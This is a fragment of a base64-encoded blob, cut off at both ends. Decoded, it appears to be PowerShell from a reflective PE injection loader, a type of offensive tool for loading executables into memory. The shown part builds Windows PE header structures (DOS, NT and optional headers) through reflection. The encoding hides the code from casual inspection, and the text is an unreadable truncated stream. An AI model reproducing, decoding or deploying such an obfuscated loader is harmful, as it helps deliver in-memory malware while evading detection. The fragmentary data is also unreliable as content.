5TZXRPZmZzZXQoNTApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdXaW4zMlZlcnNpb25WYWx1ZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg1MikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkltYWdlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDU2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhZGVycycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg2MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoZWNrU3VtJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDY0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU3Vic3lzdGVtJywgJFN1YlN5c3RlbVR5cGUsICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDY4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGxsQ2hhcmFjdGVyaXN0aWNzJywgJERsbENoYXJhY3RlcmlzdGljc1R5cGUsICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDcwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mU3RhY2tSZXNlcnZlJywgW1VJbnQ2NF0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDcyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mU3RhY2tDb21taXQnLCBbVUludDY0XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoODApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFwUmVzZXJ2ZScsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCg4OCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYXBDb21taXQnLCBbVUludDY0XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoOTYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb2FkZXJGbGFncycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxMDQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZlJ2YUFuZFNpemVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEwOCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0V4cG9ydFRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMTIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdJbXBvcnRUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTIwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUmVzb3VyY2VUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTI4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRXhjZXB0aW9uVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEzNikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NlcnRpZmljYXRlVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE0NCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0Jhc2VSZWxvY2F0aW9uVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE1MikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0RlYnVnJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNjApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBcmNoaXRlY3R1cmUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2OCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0dsb2JhbFB0cicsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTc2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVExTVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE4NCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvYWRDb25maWdUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTkyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQm91bmRJbXBvcnQnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwMCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0lBVCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjA4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGVsYXlJbXBvcnREZXNjcmlwdG9yJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMTYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDTFJSdW50aW1lSGVhZGVyJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMjQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdSZXNlcnZlZCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjMyKSB8IE91dC1OdWxsCiAgICAgICAgJElNQUdFX09QVElPTkFMX0hFQURFUjY0ID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQgLVZhbHVlICRJTUFHRV9PUFRJT05BTF9IRUFERVI2NAoKICAgICAgICAjU3RydWN0IElNQUdFX09QVElPTkFMX0hFQURFUjMyCiAgICAgICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBFeHBsaWNpdExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfT1BUSU9OQUxfSEVBREVSMzInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyMjQpCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFnaWMnLCAkTWFnaWNUeXBlLCAnUHVibGljJykpLlNldE9mZnNldCgwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JMaW5rZXJWZXJzaW9uJywgW0J5dGVdLCAnUHVibGljJykpLlNldE9mZnNldCgyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JMaW5rZXJWZXJzaW9uJywgW0J5dGVdLCAnUHVibGljJykpLlNldE9mZnNldCgzKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mQ29kZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSW5pdGlhbGl6ZWREYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZVbmluaXRpYWxpemVkRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxMikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZkVudHJ5UG9pbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlT2ZDb2RlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZU9mRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgyNCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltYWdlQmFzZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgyOCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NlY3Rpb25BbGlnbm1lbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMzIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaWxlQWxpZ25tZW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDM2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JJbWFnZVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckltYWdlVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0NikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0OCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg1MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1dpbjMyVmVyc2lvblZhbHVlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDUyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSW1hZ2UnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFkZXJzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDYwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hlY2tTdW0nLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTdWJzeXN0ZW0nLCAkU3ViU3lzdGVtVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEbGxDaGFyYWN0ZXJpc3RpY3MnLCAkRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja1Jlc2VydmUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja0NvbW1pdCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg3NikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYXBSZXNlcnZlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDgwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhcENvbW1pdCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg4NCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvYWRlckZsYWdzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDg4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZSdmFBbmRTaXplcycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg5MikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0V4cG9ydFRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCg5NikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltcG9ydFRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMDQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdSZXNvdXJjZVRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMTIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdFeGNlcHRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTIwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2VydGlmaWNhdGVUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTI4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZVJlbG9jYXRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTM2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGVidWcnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE0NCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FyY2hpdGVjdHVyZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTUyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnR2xvYmFsUHRyJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNjApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUTFNUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTY4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9hZENvbmZpZ1RhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNzYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCb3VuZEltcG9ydCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTg0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSUFUJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxOTIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEZWxheUltcG9ydERlc2NyaXB0b3InLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwMCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NMUlJ1bnRpbWVIZWFkZXInLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwOCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Jlc2VydmVkJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMTYpIHwgT3V0LU51bGwKICAgICAgICAkSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9PUFRJT05BTF9IRUFERVIzMiAtVmFsdWUgJElNQUdFX09QVElPTkFMX0hFQURFUjMyCgogICAgICAgICNTdHJ1Y3QgSU1BR0VfTlRfSEVBREVSUzY0CiAgICAgICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9OVF9IRUFERVJTNjQnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyNjQpCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaWduYXR1cmUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpbGVIZWFkZXInLCAkSU1BR0VfRklMRV9IRUFERVIsICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdPcHRpb25hbEhlYWRlcicsICRJTUFHRV9PUFRJT05BTF9IRUFERVI2NCwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkSU1BR0VfTlRfSEVBREVSUzY0ID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUzY0IC1WYWx1ZSAkSU1BR0VfTlRfSEVBREVSUzY0CiAgICAgICAgCiAgICAgICAgI1N0cnVjdCBJTUFHRV9OVF9IRUFERVJTMzIKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX05UX0hFQURFUlMzMicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDI0OCkKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpZ25hdHVyZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRmlsZUhlYWRlcicsICRJTUFHRV9GSUxFX0hFQURFUiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ09wdGlvbmFsSGVhZGVyJywgJElNQUdFX09QVElPTkFMX0hFQURFUjMyLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9OVF9IRUFERVJTMzIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTMzIgLVZhbHVlICRJTUFHRV9OVF9IRUFERVJTMzIKCiAgICAgICAgI1N0cnVjdCBJTUFHRV9ET1NfSEVBREVSCiAgICAgICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9ET1NfSEVBREVSJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgNjQpCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX21hZ2ljJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NibHAnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3AnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3JsYycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jcGFyaGRyJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX21pbmFsbG9jJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX21heGFsbG9jJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX3NzJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX3NwJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NzdW0nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfaXAnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbGZhcmxjJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX292bm8nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCiAgICAgICAgJGVfcmVzRmllbGQgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfcmVzJywgW1VJbnQxNltdXSwgJ1B1YmxpYywgSGFzRmllbGRNYXJzaGFsJykKICAgICAgICAkQ29uc3RydWN0b3JWYWx1ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuVW5tYW5hZ2VkVHlwZV06OkJ5VmFsQXJyYXkKICAgICAgICAkRmllbGRBcnJheSA9IEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsQXNBdHRyaWJ1dGVdLkdldEZpZWxkKCdTaXplQ29uc3QnKSkKICAgICAgICAkQXR0cmliQnVpbGRlciA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5DdXN0b21BdHRyaWJ1dGVCdWlsZGVyKCRDb25zdHJ1Y3RvckluZm8sICRDb25zdHJ1Y3RvclZhbHVlLCAkRmllbGRBcnJheSwgQChbSW50MzJdIDQpKQogICAgICAgICRlX3Jlc0ZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcikKCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX29lbWlkJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX29lbWluZm8nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCiAgICAgICAgJGVfcmVzMkZpZWxkID0gJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX3JlczInLCBbVUludDE2W11dLCAnUHVibGljLCBIYXNGaWVsZE1hcnNoYWwnKQogICAgICAgICRDb25zdHJ1Y3RvclZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Vbm1hbmFnZWRUeXBlXTo6QnlWYWxBcnJheQogICAgICAgICRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjd